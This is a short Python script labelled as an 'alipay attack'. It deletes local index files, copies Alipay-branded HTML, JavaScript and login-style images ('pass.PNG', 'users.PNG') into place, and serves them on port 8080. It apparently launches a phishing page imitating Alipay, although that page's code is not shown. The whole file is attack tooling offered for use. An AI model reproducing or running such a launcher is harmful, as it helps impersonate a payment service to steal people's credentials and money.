#alipay attack
#use Html5 , Js , Python
import os
os.system("chmod +x ./")
os.system("rm -f index.html")
os.system("rm -f index.js")

os.system("cp alipay/index.html ./")
os.system("cp alipay/index.js ./")
os.system("cp alipay/pass.PNG ./")
os.system("cp alipay/users.PNG ./")
with open("date","a") as f:
    f.write("start the index.html\r\n")
    f.write("strat the index.js\r\n")

import os
print("start the port 8080 on http://localhost and http://127.0.0.1")
os.system("python3 -m http.server 8080")